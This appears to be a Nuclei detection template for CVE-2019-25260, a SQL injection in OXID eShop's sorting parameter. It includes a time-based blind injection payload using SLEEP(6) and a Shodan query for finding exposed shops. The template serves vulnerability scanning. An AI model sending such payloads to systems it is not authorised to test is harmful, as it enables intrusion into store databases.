id: CVE-2019-25260

info:
  name: OXID eShop < 6.3.4 - SQL Injection via Sorting Parameter
  author: bswearingen
  severity: high
  description: |
    OXID eShop versions 6.x prior to 6.3.4 contains a SQL injection vulnerability in the 'sorting' parameter that allows attackers to insert malicious database content. Attackers can exploit the vulnerability by manipulating the sorting parameter to inject PHP code into the database and execute arbitrary code through crafted URLs.
  impact: |
    Attackers can inject SQL and potentially achieve code execution via database content manipulation.
  remediation: |
    Upgrade OXID eShop to version 6.3.4 or later.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-25260
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 8.2
    cve-id: CVE-2019-25260
    cwe-id: CWE-89
  metadata:
    verified: true
    vendor: oxid-esales
    product: eshop
    shodan-query: http.component:"OXID"
  tags: cve,cve2019,oxid,eshop,sqli

http:
  - raw:
      - |
        GET /index.php?cl=alist&cnid=root&ldtype=infogrid&_artperpage=100&sorting=oxtitle%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(6)))a)--%20- HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'

      - type: status
        status:
          - 200
          - 500
        condition: or
